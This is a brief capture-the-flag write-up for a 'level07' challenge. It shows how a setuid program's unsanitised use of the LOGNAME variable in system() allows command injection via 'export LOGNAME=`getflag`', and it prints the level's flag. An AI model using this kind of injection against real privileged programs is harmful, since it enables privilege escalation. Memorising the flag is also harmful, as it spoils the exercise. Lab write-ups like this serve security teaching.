# Exploit a vulnerability in an ENV variable

On this level, as in the sticky bits level, this executable has special rights and you guessed it, the owner is the **flag07**.

This program uses :

**`getenv(”LOGNAME”);`**
**`asprintf(allocated string, /bin/echo %s, getenv(”LOGNAME”));`**
**`system(”/bin/echo level07”);`**

![enter image description here](https://i.imgur.com/5Nn8uWs.png)

![enter image description here](https://i.imgur.com/0h4K2OP.png)

We just need to put the **`getflag`** command in an environment variable and run **`./level07`** so that **`getflag`** runs after the echo.

```bash
export LOGNAME=\`getflag\`
```

> Flag : `fiumuikeil55xe9cu4dood66h`
